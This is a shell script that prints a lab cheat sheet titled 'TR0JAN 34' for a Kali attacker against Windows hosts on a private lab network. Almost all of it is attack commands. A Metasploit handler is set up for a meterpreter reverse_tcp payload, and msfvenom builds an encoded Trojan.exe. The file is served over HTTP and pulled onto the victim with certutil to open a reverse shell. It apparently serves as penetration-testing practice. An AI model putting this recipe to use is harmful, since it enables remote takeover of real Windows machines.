echo '
--] TR0JAN 34

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
TANGO      === WIN 7              IP === 134
OSCAR      === WIN 10             IP === 133
LAB        === NET                ALL === 172.16.14.IP


OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> use exploit/multi/handler
OPERATOR    ==> TASK ==> set payload windows/meterpreter/reverse_tcp
OPERATOR    ==> TASK ==> set lhost IP_OPERATOR
OPERATOR    ==> TASK ==> set lport 4444
OPERATOR    ==> TASK ==> exploit -j

OPERATOR    ==> TASK ==> msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP_OPERATOR] LPORT=[PORT_OPERATOR] -e x86/shikata_ga_nai -f exe -o Trojan.exe
OPERATOR    ==> TASK ==> msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.14.132 LPORT=4444 -e x86/shikata_ga_nai -f exe -o Trojan.exe
OPERATOR    ==> TASK ==> python2 -m SimpleHTTPServer 80
OPERATOR    ==> TASK ==> python3 -m http.server 80  

TANGO    ==> TASK ==> go internet explorer and tape http://IP_OPERATOR/Trojan.exe
TANGO    ==> TASK ==> certutil.exe -urlcache -split -f "http://IP_OPERATOR/Trojan.exe" Trojan.exe
TANGO    ==> TASK ==> netstat and show the ESTABLISHED 

OPERATOR    ==> TASK ==> sessions -i



'
read